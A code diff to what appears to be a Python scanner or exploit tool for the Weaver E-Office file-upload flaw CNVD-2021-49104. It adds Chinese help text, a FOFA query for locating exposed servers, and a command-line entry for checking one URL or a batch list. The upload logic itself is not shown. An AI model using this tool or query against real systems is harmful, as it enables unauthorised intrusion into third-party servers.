@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
-# Author: Noth
-# Time: 2023-9-26
+# 作者: Noth
+# 時間: 2023-9-26
 # fofa: app="泛微-EOffice" && country="CN"
 # CNVD-2021-49104
 
@@ -89,4 +89,23 @@ def upload_pl(files):
 def help():
     print(' ')
     print('[+] python3 eoffice_fileupload -h 查看幫助')
-    print('[+] python3 eoffice_fileupload -upload
+    print('[+] python3 eoffice_fileupload -upload http://127.0.0.1:8020  驗證單個 url')
+    print('[+] python3 eoffice_fileupload --upload-pl url.txt  批量驗證 url')
+
+if __name__ == "__main__":
+    try:
+        print('')
+        cmd1 = sys.argv[1]
+
+        if cmd1 == '-h':
+            help()
+        elif cmd1 == '-upload':
+            cmd2 = sys.argv[2]
+            upload(cmd2)
+        elif cmd1 == '--upload-pl':
+            cmd2 = sys.argv[2]
+            upload_pl(cmd2)
+        else:
+            print('[-]請輸入正確的參數，或者-h 查看幫助')
+    except:
+        print('[-]請輸入-h查看幫助')
